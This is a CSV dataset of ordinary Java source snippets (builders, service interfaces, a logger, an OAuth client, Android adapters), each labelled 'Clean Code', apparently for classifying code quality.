text,label,text_label
"/** 
 * @author jiachun.fjc
 */
public final class PlacementDriverOptionsConfigured implements Configured<PlacementDriverOptions> {
  private final PlacementDriverOptions opts;
  public static PlacementDriverOptionsConfigured newConfigured(){
    return new PlacementDriverOptionsConfigured(new PlacementDriverOptions());
  }
  public PlacementDriverOptionsConfigured withFake(  final boolean fake){
    this.opts.setFake(fake);
    return this;
  }
  public PlacementDriverOptionsConfigured withCliOptions(  final CliOptions cliOptions){
    this.opts.setCliOptions(cliOptions);
    return this;
  }
  public PlacementDriverOptionsConfigured withPdRpcOptions(  final RpcOptions pdRpcOptions){
    this.opts.setPdRpcOptions(pdRpcOptions);
    return this;
  }
  public PlacementDriverOptionsConfigured withPdGroupId(  final String pdGroupId){
    this.opts.setPdGroupId(pdGroupId);
    return this;
  }
  public PlacementDriverOptionsConfigured withRegionRouteTableOptionsList(  final List<RegionRouteTableOptions> regionRouteTableOptionsList){
    this.opts.setRegionRouteTableOptionsList(regionRouteTableOptionsList);
    return this;
  }
  public PlacementDriverOptionsConfigured withInitialServerList(  final String initialServerList){
    this.opts.setInitialServerList(initialServerList);
    return this;
  }
  public PlacementDriverOptionsConfigured withInitialPdServerList(  final String initialPdServerList){
    this.opts.setInitialPdServerList(initialPdServerList);
    return this;
  }
  @Override public PlacementDriverOptions config(){
    return this.opts;
  }
  private PlacementDriverOptionsConfigured(  PlacementDriverOptions opts){
    this.opts=opts;
  }
}
",0,Clean Code
"/** 
 * @author AllDataDC
 * @date 2023/3/26 11:14service registry /xxl-rpc/dev/ - key01(service01) - value01 (ip:port01) - value02 (ip:port02)
 */
public abstract class ServiceRegistry {
  /** 
 * start
 */
  public abstract void start(  Map<String,String> param);
  /** 
 * start
 */
  public abstract void stop();
  /** 
 * registry service, for mult
 * @param keys      service key
 * @param value     service value/ip:port
 * @return
 */
  public abstract boolean registry(  Set<String> keys,  String value);
  /** 
 * remove service, for mult
 * @param keys
 * @param value
 * @return
 */
  public abstract boolean remove(  Set<String> keys,  String value);
  /** 
 * discovery services, for mult
 * @param keys
 * @return
 */
  public abstract Map<String,TreeSet<String>> discovery(  Set<String> keys);
  /** 
 * discovery service, for one
 * @param key   service key
 * @return      service value/ip:port
 */
  public abstract TreeSet<String> discovery(  String key);
}",0,Clean Code
"public class MvndDaemonLogger extends MavenBaseLogger {
  final DateTimeFormatter dateTimeFormatter=new DateTimeFormatterBuilder().appendPattern(""HH:mm:ss.SSS"").toFormatter();
  public MvndDaemonLogger(  String name){
    super(name);
  }
  @Override protected String renderLevel(  int levelInt){
switch (levelInt) {
case LOG_LEVEL_ERROR:
      return ""E"";
case LOG_LEVEL_WARN:
    return ""W"";
case LOG_LEVEL_INFO:
  return ""I"";
case LOG_LEVEL_DEBUG:
return ""D"";
case LOG_LEVEL_TRACE:
return ""T"";
}
throw new IllegalStateException(""Unrecognized level ["" + levelInt + ""]"");
}
@Override protected void handleNormalizedLoggingCall(Level level,Marker marker,String messagePattern,Object[] arguments,Throwable throwable){
StringBuilder buf=new StringBuilder(32);
buf.append(dateTimeFormatter.format(LocalTime.now()));
buf.append("" "");
buf.append(renderLevel(level.toInt()));
buf.append("" "");
String message=MessageFormatter.basicArrayFormat(messagePattern,arguments);
buf.append(message);
write(buf,throwable);
}
}
",0,Clean Code
"/** 
 * 保存TextArea的变更
 */
public class TextAreaListener implements DocumentListener {
  JScrollPanelWithHeader TextAreaPanel;
  private DomainPanel domainPanel;
  public TextAreaListener(  DomainPanel domainPanel,  JScrollPanelWithHeader panel){
    this.domainPanel=domainPanel;
    this.TextAreaPanel=panel;
  }
  /** 
 * 当UI中的数据发生变化时,需要同步到数据模型、并写入数据库
 */
  public void saveToDBAndSyncModel(){
    if (domainPanel.isListenerIsOn()) {
      DomainDao dao=new DomainDao(BurpExtender.getDataLoadManager().getCurrentDBFile());
      Set<String> content=new HashSet<>(SwingUtils.getLinesFromTextArea(TextAreaPanel.getTextArea()));
      TextAreaType type=TextAreaPanel.getTextAreaType();
      domainPanel.getDomainResult().fillContentByType(type,content);
      dao.createOrUpdateByType(content,type);
    }
  }
  @Override public void removeUpdate(  DocumentEvent e){
    saveToDBAndSyncModel();
  }
  @Override public void insertUpdate(  DocumentEvent e){
    saveToDBAndSyncModel();
  }
  @Override public void changedUpdate(  DocumentEvent arg0){
    saveToDBAndSyncModel();
  }
}
",0,Clean Code
"/** 
 * This interface defines a complete generic visitor for a parse tree produced by  {@link PropertiesParser}.
 * @param < T > The return type of the visit operation. Use {@link Void} foroperations with no return type.
 */
public interface PropertiesVisitor<T> extends ParseTreeVisitor<T> {
  /** 
 * Visit a parse tree produced by  {@link PropertiesParser#propertiesFile}.
 * @param ctx the parse tree
 * @return the visitor result
 */
  T visitPropertiesFile(  PropertiesParser.PropertiesFileContext ctx);
  /** 
 * Visit a parse tree produced by  {@link PropertiesParser#row}.
 * @param ctx the parse tree
 * @return the visitor result
 */
  T visitRow(  PropertiesParser.RowContext ctx);
  /** 
 * Visit a parse tree produced by  {@link PropertiesParser#decl}.
 * @param ctx the parse tree
 * @return the visitor result
 */
  T visitDecl(  PropertiesParser.DeclContext ctx);
  /** 
 * Visit a parse tree produced by  {@link PropertiesParser#key}.
 * @param ctx the parse tree
 * @return the visitor result
 */
  T visitKey(  PropertiesParser.KeyContext ctx);
  /** 
 * Visit a parse tree produced by  {@link PropertiesParser#value}.
 * @param ctx the parse tree
 * @return the visitor result
 */
  T visitValue(  PropertiesParser.ValueContext ctx);
  /** 
 * Visit a parse tree produced by  {@link PropertiesParser#comment}.
 * @param ctx the parse tree
 * @return the visitor result
 */
  T visitComment(  PropertiesParser.CommentContext ctx);
}
",0,Clean Code
"/** 
 * @author jiachun.fjc
 */
public final class ConcurrentSet<E> extends AbstractSet<E> implements Serializable {
  private static final long serialVersionUID=-6761513279741915432L;
  private final ConcurrentMap<E,Boolean> map;
  /** 
 * Creates a new instance which wraps the specified  {@code map}.
 */
  public ConcurrentSet(){
    map=Maps.newConcurrentMap();
  }
  @Override public int size(){
    return map.size();
  }
  @SuppressWarnings(""SuspiciousMethodCalls"") @Override public boolean contains(  Object o){
    return map.containsKey(o);
  }
  @Override public boolean add(  E o){
    return map.putIfAbsent(o,Boolean.TRUE) == null;
  }
  @Override public boolean remove(  Object o){
    return map.remove(o) != null;
  }
  @Override public void clear(){
    map.clear();
  }
  @Override public Iterator<E> iterator(){
    return map.keySet().iterator();
  }
}",0,Clean Code
"@Import(DatabaseTableServiceImpl.class) public class DatabaseTableServiceImplTest extends BaseDbUnitTest {
  @Resource private DatabaseTableServiceImpl databaseTableService;
  @MockBean private DataSourceConfigService dataSourceConfigService;
  @Test public void testGetTableList(){
    Long dataSourceConfigId=randomLongId();
    DataSourceConfigDO dataSourceConfig=new DataSourceConfigDO().setUsername(""sa"").setPassword("""").setUrl(""jdbc:h2:mem:testdb"");
    when(dataSourceConfigService.getDataSourceConfig(eq(dataSourceConfigId))).thenReturn(dataSourceConfig);
    List<TableInfo> tables=databaseTableService.getTableList(dataSourceConfigId,""config"",""参数"");
    assertEquals(1,tables.size());
    assertTableInfo(tables.get(0));
  }
  @Test public void testGetTable(){
    Long dataSourceConfigId=randomLongId();
    DataSourceConfigDO dataSourceConfig=new DataSourceConfigDO().setUsername(""sa"").setPassword("""").setUrl(""jdbc:h2:mem:testdb"");
    when(dataSourceConfigService.getDataSourceConfig(eq(dataSourceConfigId))).thenReturn(dataSourceConfig);
    TableInfo tableInfo=databaseTableService.getTable(dataSourceConfigId,""infra_config"");
    assertTableInfo(tableInfo);
  }
  private void assertTableInfo(  TableInfo tableInfo){
    assertEquals(""infra_config"",tableInfo.getName());
    assertEquals(""参数配置表"",tableInfo.getComment());
    assertEquals(13,tableInfo.getFields().size());
    TableField idField=tableInfo.getFields().get(0);
    assertEquals(""id"",idField.getName());
    assertEquals(JdbcType.BIGINT,idField.getMetaInfo().getJdbcType());
    assertEquals(""编号"",idField.getComment());
    assertFalse(idField.getMetaInfo().isNullable());
    assertTrue(idField.isKeyFlag());
    assertTrue(idField.isKeyIdentityFlag());
    assertEquals(DbColumnType.LONG,idField.getColumnType());
    assertEquals(""id"",idField.getPropertyName());
    TableField nameField=tableInfo.getFields().get(3);
    assertEquals(""name"",nameField.getName());
    assertEquals(JdbcType.VARCHAR,nameField.getMetaInfo().getJdbcType());
    assertEquals(""名字"",nameField.getComment());
    assertFalse(nameField.getMetaInfo().isNullable());
    assertFalse(nameField.isKeyFlag());
    assertFalse(nameField.isKeyIdentityFlag());
    assertEquals(DbColumnType.STRING,nameField.getColumnType());
    assertEquals(""name"",nameField.getPropertyName());
  }
}
",0,Clean Code
"/** 
 * User check.
 * @author <a href=""http://88250.b3log.org"">Liang Ding</a>
 * @version 2.0.0.0, Feb 11, 2020
 * @since 0.2.5
 */
@Singleton public class UserCheckMidware {
  /** 
 * User query service.
 */
  @Inject private UserQueryService userQueryService;
  public void handle(  final RequestContext context){
    final String userName=context.pathVar(""userName"");
    if (UserExt.NULL_USER_NAME.equals(userName)) {
      context.sendError(404);
      context.abort();
    }
    final JSONObject user=userQueryService.getUserByName(userName);
    if (null == user) {
      context.sendError(404);
      context.abort();
      return;
    }
    if (UserExt.USER_STATUS_C_NOT_VERIFIED == user.optInt(UserExt.USER_STATUS)) {
      context.sendError(404);
      context.abort();
      return;
    }
    if (UserExt.USER_STATUS_C_INVALID == user.optInt(UserExt.USER_STATUS)) {
      context.sendError(404);
      context.abort();
      return;
    }
    context.attr(User.USER,user);
    context.handle();
  }
}
",0,Clean Code
"public class SearchTypeUtil {
  private static final Resources resources=Shaft.getContext().getResources();
  public static final int defaultSearchType=5;
  private static final Pattern WEB_URL_PATTERN=Patterns.WEB_URL;
  private static final Pattern NUMBERIC_PATTERN=Pattern.compile(""(?:\\b|\\D)([1-9]\\d{3,9})(?:\\b|\\D)"");
  public static String[] SEARCH_TYPE_NAME=new String[]{resources.getString(R.string.string_430),resources.getString(R.string.string_150),resources.getString(R.string.string_152),resources.getString(R.string.string_153),resources.getString(R.string.string_341),resources.getString(R.string.string_431)};
  public static final int SEARCH_TYPE_DB_KEYWORD=0;
  public static final int SEARCH_TYPE_DB_ILLUSTSID=1;
  public static final int SEARCH_TYPE_DB_USERKEYWORD=2;
  public static final int SEARCH_TYPE_DB_USERID=3;
  public static final int SEARCH_TYPE_DB_NOVELID=4;
  public static final int SEARCH_TYPE_DB_URL=5;
  public static int getSuggestSearchType(  String content){
    try {
      if (TextUtils.isEmpty(content)) {
        return defaultSearchType;
      }
      if (WEB_URL_PATTERN.matcher(content).matches()) {
        return 4;
      }
      Matcher matcher=NUMBERIC_PATTERN.matcher(content);
      if (matcher.find()) {
        long number=Long.parseLong(matcher.group(1));
        if (number > 10000000L) {
          return 1;
        }
 else {
          return 2;
        }
      }
    }
 catch (    Exception e) {
      e.printStackTrace();
    }
    return defaultSearchType;
  }
}
",0,Clean Code
"public class EventCheckerService {
  private static volatile EventCheckerService instance;
  public static EventCheckerService getInstance(){
    if (instance == null) {
synchronized (EventCheckerService.class) {
        if (instance == null) {
          instance=new EventCheckerService();
        }
      }
    }
    return instance;
  }
  public boolean sendMsg(  int jobId,  Properties props,  Logger log){
    if (props != null) {
      return new EventCheckSender(props).sendMsg(jobId,props,log);
    }
 else {
      log.error(""create EventCheckSender failed {}"");
      return false;
    }
  }
  /** 
 * Receiving a message first queries the consumption record, and then starts to consume after the last consumption, and no consumption starts after the job starts. The received message is performed in an active query manner, and the target message is repeatedly queried within a time period when the set target is not exceeded.
 */
  public boolean reciveMsg(  int jobId,  Properties props,  Logger log){
    if (props != null) {
      return new DefaultEventcheckReceiver(props).reciveMsg(jobId,props,log);
    }
 else {
      log.error(""create EventCheckSender failed {}"");
      return false;
    }
  }
}
",0,Clean Code
"/** 
 * @author geekidea
 * @date 2023/11/22
 */
public class SystemTypeUtil {
  /** 
 * 获取系统类型枚举
 * @param request
 * @return
 * @throws Exception
 */
  public static SystemType getSystemTypeByPath(  HttpServletRequest request){
    String servletPath=request.getServletPath();
    return getSystemTypeByPath(servletPath);
  }
  /** 
 * 根据请求路径获取系统类型枚举
 * @param servletPath
 * @return
 * @throws Exception
 */
  public static SystemType getSystemTypeByPath(  String servletPath){
    if (StringUtils.isBlank(servletPath)) {
      return null;
    }
    if (servletPath.startsWith(LoginConstant.ADMIN_URL_PREFIX)) {
      return SystemType.ADMIN;
    }
 else     if (servletPath.startsWith(LoginConstant.APP_URL_PREFIX)) {
      return SystemType.APP;
    }
    return null;
  }
  /** 
 * 判断token是那个端
 * @param token
 * @return
 * @throws Exception
 */
  public static SystemType getSystemTypeByToken(  String token){
    if (StringUtils.isBlank(token)) {
      return null;
    }
    if (token.startsWith(LoginConstant.ADMIN_TOKEN_PREFIX)) {
      return SystemType.ADMIN;
    }
 else     if (token.startsWith(LoginConstant.APP_TOKEN_PREFIX)) {
      return SystemType.APP;
    }
    return null;
  }
  /** 
 * 判断token是那个端
 * @return
 * @throws Exception
 */
  public static SystemType getSystemTypeByToken(){
    String token=TokenUtil.getToken();
    return getSystemTypeByToken(token);
  }
  /** 
 * 判断token是那个端
 * @return
 * @throws Exception
 */
  public static Integer getSystemTypeCodeByToken(){
    SystemType systemType=getSystemTypeByToken();
    if (systemType != null) {
      return systemType.getCode();
    }
    return null;
  }
  /** 
 * 判断是否是管理后台系统
 * @return
 * @throws Exception
 */
  public static boolean isAdminSystem(){
    SystemType systemType=getSystemTypeByToken();
    if (SystemType.ADMIN == systemType) {
      return true;
    }
    return false;
  }
  /** 
 * 判断是否是APP移动端系统
 * @return
 * @throws Exception
 */
  public static boolean isAppSystem(){
    SystemType systemType=getSystemTypeByToken();
    if (SystemType.APP == systemType) {
      return true;
    }
    return false;
  }
}",0,Clean Code
"public class AdapterRecyclerView extends RecyclerView.Adapter<RecyclerView.ViewHolder> {
  @Override public int getItemViewType(  int position){
    if (position != 4 && position != 7) {
      return 0;
    }
    return 1;
  }
  @Override public RecyclerView.ViewHolder onCreateViewHolder(  ViewGroup parent,  int viewType){
    View view;
    if (viewType == 1) {
      view=LayoutInflater.from(parent.getContext()).inflate(R.layout.item_videoview,parent,false);
      return new VideoHolder(view);
    }
 else {
      view=LayoutInflater.from(parent.getContext()).inflate(R.layout.item_textview,parent,false);
      return new TextHolder(view);
    }
  }
  @Override public void onBindViewHolder(  RecyclerView.ViewHolder holder,  int position){
    if (position != 4 && position != 7) {
      TextHolder textHolder=(TextHolder)holder;
    }
 else {
      VideoHolder videoHolder=(VideoHolder)holder;
      videoHolder.jzvdStd.setUp(UrlsKt.getVl1()[position],UrlsKt.getTl1()[position],Jzvd.SCREEN_NORMAL);
      videoHolder.jzvdStd.positionInList=position;
      Glide.with(TinyWindowRecycleViewMultiHolderActivity.this).load(UrlsKt.getPl1()[position]).into(videoHolder.jzvdStd.posterImageView);
    }
  }
  @Override public int getItemCount(){
    return 10;
  }
class VideoHolder extends RecyclerView.ViewHolder {
    JzvdStd jzvdStd;
    public VideoHolder(    View itemView){
      super(itemView);
      jzvdStd=itemView.findViewById(R.id.videoplayer);
    }
  }
class TextHolder extends RecyclerView.ViewHolder {
    TextView textView;
    public TextHolder(    View itemView){
      super(itemView);
      textView=itemView.findViewById(R.id.textview);
    }
  }
}
",0,Clean Code
"public class PostgreSQLCommandSet extends AbstractCommandSet {
  public PostgreSQLCommandSet(  Database db){
    super(db);
  }
  @Override @Language(""postgresql"") public String createMapTableStatement(){
    return null;
  }
  @Override @Language(""postgresql"") public String createCompressionTableStatement(){
    return null;
  }
  @Override @Language(""postgresql"") public String createItemStorageTableStatement(){
    return null;
  }
  @Override @Language(""postgresql"") public String createItemStorageDataTableStatement(){
    return null;
  }
  @Override @Language(""postgresql"") public String createGridStorageTableStatement(){
    return null;
  }
  @Override @Language(""postgresql"") public String createGridStorageDataTableStatement(){
    return null;
  }
  @Override @Language(""postgresql"") public String itemStorageWriteStatement(){
    return null;
  }
  @Override @Language(""postgresql"") public String itemStorageReadStatement(){
    return null;
  }
  @Override @Language(""postgresql"") public String itemStorageDeleteStatement(){
    return null;
  }
  @Override @Language(""postgresql"") public String itemStorageHasStatement(){
    return null;
  }
  @Override @Language(""postgresql"") public String gridStorageWriteStatement(){
    return null;
  }
  @Override @Language(""postgresql"") public String gridStorageReadStatement(){
    return null;
  }
  @Override @Language(""postgresql"") public String gridStorageDeleteStatement(){
    return null;
  }
  @Override @Language(""postgresql"") public String gridStorageHasStatement(){
    return null;
  }
  @Override @Language(""postgresql"") public String gridStorageListStatement(){
    return null;
  }
  @Override @Language(""postgresql"") public String gridStorageCountMapItemsStatement(){
    return null;
  }
  @Override @Language(""postgresql"") public String gridStoragePurgeMapStatement(){
    return null;
  }
  @Override @Language(""postgresql"") public String purgeMapStatement(){
    return null;
  }
  @Override @Language(""postgresql"") public String hasMapStatement(){
    return null;
  }
  @Override @Language(""postgresql"") public String listMapIdsStatement(){
    return null;
  }
  @Override @Language(""postgresql"") public String findMapKeyStatement(){
    return null;
  }
  @Override @Language(""postgresql"") public String createMapKeyStatement(){
    return null;
  }
  @Override @Language(""postgresql"") public String findCompressionKeyStatement(){
    return null;
  }
  @Override @Language(""postgresql"") public String createCompressionKeyStatement(){
    return null;
  }
  @Override @Language(""postgresql"") public String findItemStorageKeyStatement(){
    return null;
  }
  @Override @Language(""postgresql"") public String createItemStorageKeyStatement(){
    return null;
  }
  @Override @Language(""postgresql"") public String findGridStorageKeyStatement(){
    return null;
  }
  @Override @Language(""postgresql"") public String createGridStorageKeyStatement(){
    return null;
  }
}
",0,Clean Code
"class Path {
  static ClassPathElement getClassPathElement(  File file) throws ZipException, IOException {
    if (file.isDirectory()) {
      return new FolderPathElement(file);
    }
 else     if (file.isFile()) {
      return new ArchivePathElement(new ZipFile(file));
    }
 else     if (file.exists()) {
      throw new IOException(""\"""" + file.getPath() + ""\"" is not a directory neither a zip file"");
    }
 else {
      throw new FileNotFoundException(""File \"""" + file.getPath() + ""\"" not found"");
    }
  }
  List<ClassPathElement> elements=new ArrayList<ClassPathElement>();
  private final String definition;
  private final ByteArrayOutputStream baos=new ByteArrayOutputStream(40 * 1024);
  private final byte[] readBuffer=new byte[20 * 1024];
  Path(  String definition) throws IOException {
    this.definition=definition;
    for (    String filePath : definition.split(Pattern.quote(File.pathSeparator))) {
      try {
        addElement(getClassPathElement(new File(filePath)));
      }
 catch (      IOException e) {
        throw new IOException(""Wrong classpath: "" + e.getMessage(),e);
      }
    }
  }
  private static byte[] readStream(  InputStream in,  ByteArrayOutputStream baos,  byte[] readBuffer) throws IOException {
    try {
      for (; ; ) {
        int amt=in.read(readBuffer);
        if (amt < 0) {
          break;
        }
        baos.write(readBuffer,0,amt);
      }
    }
  finally {
      in.close();
    }
    return baos.toByteArray();
  }
  @Override public String toString(){
    return definition;
  }
  Iterable<ClassPathElement> getElements(){
    return elements;
  }
  private void addElement(  ClassPathElement element){
    assert element != null;
    elements.add(element);
  }
  synchronized DirectClassFile getClass(  String path) throws FileNotFoundException {
    DirectClassFile classFile=null;
    for (    ClassPathElement element : elements) {
      try {
        InputStream in=element.open(path);
        try {
          byte[] bytes=readStream(in,baos,readBuffer);
          baos.reset();
          classFile=new DirectClassFile(bytes,path,false);
          classFile.setAttributeFactory(StdAttributeFactory.THE_ONE);
          break;
        }
  finally {
          in.close();
        }
      }
 catch (      IOException e) {
      }
    }
    if (classFile == null) {
      throw new FileNotFoundException(""File \"""" + path + ""\"" not found"");
    }
    return classFile;
  }
}
",0,Clean Code
"/** 
 * Builder for generating an intent configured with extra data.
 */
public static class Builder {
  private final Intent intent;
  /** 
 * Create builder with suffix
 * @param actionSuffix
 */
  public Builder(  String actionSuffix){
    intent=new Intent(INTENT_PREFIX + actionSuffix);
  }
  /** 
 * Add extra field data value to intent being built up
 * @param fieldName
 * @param value
 * @return this builder
 */
  public Builder add(  String fieldName,  String value){
    intent.putExtra(fieldName,value);
    return this;
  }
  /** 
 * Add extra field data values to intent being built up
 * @param fieldName
 * @param values
 * @return this builder
 */
  public Builder add(  String fieldName,  CharSequence[] values){
    intent.putExtra(fieldName,values);
    return this;
  }
  /** 
 * Add extra field data value to intent being built up
 * @param fieldName
 * @param value
 * @return this builder
 */
  public Builder add(  String fieldName,  int value){
    intent.putExtra(fieldName,value);
    return this;
  }
  /** 
 * Add extra field data value to intent being built up
 * @param fieldName
 * @param values
 * @return this builder
 */
  public Builder add(  String fieldName,  int[] values){
    intent.putExtra(fieldName,values);
    return this;
  }
  /** 
 * Add extra field data value to intent being built up
 * @param fieldName
 * @param values
 * @return this builder
 */
  public Builder add(  String fieldName,  boolean[] values){
    intent.putExtra(fieldName,values);
    return this;
  }
  /** 
 * Add extra field data value to intent being built up
 * @param fieldName
 * @param value
 * @return this builder
 */
  public Builder add(  String fieldName,  Serializable value){
    intent.putExtra(fieldName,value);
    return this;
  }
  /** 
 * Get built intent
 * @return intent
 */
  public Intent toIntent(){
    return intent;
  }
}
",0,Clean Code
"/** 
 * 文件操作模板
 * @author lengleng
 * @date 2022/4/19
 */
public interface FileTemplate extends InitializingBean {
  /** 
 * 创建bucket
 * @param bucketName bucket名称
 */
  void createBucket(  String bucketName);
  /** 
 * 获取全部bucket <p> API Documentation</a>
 */
  List<Bucket> getAllBuckets();
  /** 
 * @param bucketName bucket名称
 * @see <a href= Documentation</a>
 */
  void removeBucket(  String bucketName);
  /** 
 * 上传文件
 * @param bucketName bucket名称
 * @param objectName 文件名称
 * @param stream 文件流
 * @param contextType 文件类型
 * @throws Exception
 */
  void putObject(  String bucketName,  String objectName,  InputStream stream,  String contextType) throws Exception ;
  /** 
 * 上传文件
 * @param bucketName bucket名称
 * @param objectName 文件名称
 * @param stream 文件流
 * @param contextType 文件类型
 * @throws Exception
 */
  void putObject(  String bucketName,  String objectName,  InputStream stream) throws Exception ;
  /** 
 * 获取文件
 * @param bucketName bucket名称
 * @param objectName 文件名称
 * @return 二进制流 API Documentation</a>
 */
  S3Object getObject(  String bucketName,  String objectName);
  void removeObject(  String bucketName,  String objectName) throws Exception ;
  /** 
 * @throws Exception
 */
  @Override default void afterPropertiesSet() throws Exception {
  }
  /** 
 * 根据文件前置查询文件
 * @param bucketName bucket名称
 * @param prefix 前缀
 * @param recursive 是否递归查询
 * @return S3ObjectSummary 列表
 * @see <a href=""http://docs.aws.amazon.com/goto/WebAPI/s3-2006-03-01/ListObjects"">AWS
	 * API Documentation</a>
 */
  List<S3ObjectSummary> getAllObjectsByPrefix(  String bucketName,  String prefix,  boolean recursive);
}
",0,Clean Code
"/** 
 * 程序员客栈
 * @author yadong.zhang (yadong.zhang0415(a)gmail.com)
 * @since 1.16.2
 */
public class AuthProginnRequest extends AuthDefaultRequest {
  public AuthProginnRequest(  AuthConfig config){
    super(config,AuthDefaultSource.PROGINN);
  }
  public AuthProginnRequest(  AuthConfig config,  AuthStateCache authStateCache){
    super(config,AuthDefaultSource.PROGINN,authStateCache);
  }
  @Override public AuthToken getAccessToken(  AuthCallback authCallback){
    Map<String,String> params=new HashMap<>();
    params.put(""code"",authCallback.getCode());
    params.put(""client_id"",config.getClientId());
    params.put(""client_secret"",config.getClientSecret());
    params.put(""grant_type"",""authorization_code"");
    params.put(""redirect_uri"",config.getRedirectUri());
    String response=new HttpUtils(config.getHttpConfig()).post(AuthDefaultSource.PROGINN.accessToken(),params,false).getBody();
    JSONObject accessTokenObject=JSONObject.parseObject(response);
    this.checkResponse(accessTokenObject);
    return AuthToken.builder().accessToken(accessTokenObject.getString(""access_token"")).refreshToken(accessTokenObject.getString(""refresh_token"")).uid(accessTokenObject.getString(""uid"")).tokenType(accessTokenObject.getString(""token_type"")).expireIn(accessTokenObject.getIntValue(""expires_in"")).build();
  }
  @Override public AuthUser getUserInfo(  AuthToken authToken){
    String userInfo=doGetUserInfo(authToken);
    JSONObject object=JSONObject.parseObject(userInfo);
    this.checkResponse(object);
    return AuthUser.builder().rawUserInfo(object).uuid(object.getString(""uid"")).username(object.getString(""nickname"")).nickname(object.getString(""nickname"")).avatar(object.getString(""avatar"")).email(object.getString(""email"")).gender(AuthUserGender.UNKNOWN).token(authToken).source(source.toString()).build();
  }
  /** 
 * 检查响应内容是否正确
 * @param object 请求响应内容
 */
  private void checkResponse(  JSONObject object){
    if (object.containsKey(""error"")) {
      throw new AuthException(object.getString(""error_description""));
    }
  }
  /** 
 * 返回带 {@code state}参数的授权url，授权回调时会带上这个 {@code state}
 * @param state state 验证授权流程的参数，可以防止csrf
 * @return 返回授权地址
 */
  @Override public String authorize(  String state){
    return UrlBuilder.fromBaseUrl(super.authorize(state)).queryParam(""scope"",this.getScopes("" "",true,AuthScopeUtils.getDefaultScopes(AuthProginnScope.values()))).build();
  }
}
",0,Clean Code
"/** 
 * 系统角色 服务接口
 * @author geekidea
 * @since 2022-12-26
 */
public interface SysRoleService extends IService<SysRole> {
  /** 
 * 添加系统角色
 * @param dto
 * @return
 * @throws Exception
 */
  boolean addSysRole(  SysRoleDto dto);
  /** 
 * 修改系统角色
 * @param dto
 * @return
 * @throws Exception
 */
  boolean updateSysRole(  SysRoleDto dto);
  /** 
 * 删除系统角色
 * @param id
 * @return
 * @throws Exception
 */
  boolean deleteSysRole(  Long id);
  /** 
 * 系统角色详情
 * @param id
 * @return
 * @throws Exception
 */
  SysRoleVo getSysRoleById(  Long id);
  /** 
 * 系统角色分页列表
 * @param query
 * @return
 * @throws Exception
 */
  Paging<SysRoleVo> getSysRolePage(  SysRoleQuery query);
  /** 
 * 获取所有角色列表
 * @return
 * @throws Exception
 */
  List<SysRole> getSysRoleAllList();
  /** 
 * 设置角色权限
 * @param roleMenusDto
 * @return
 * @throws Exception
 */
  boolean setRoleMenus(  RoleMenusDto roleMenusDto);
  /** 
 * 检查code是否存在
 * @param code
 * @return
 * @throws Exception
 */
  void checkCodeExists(  String code);
}",0,Clean Code
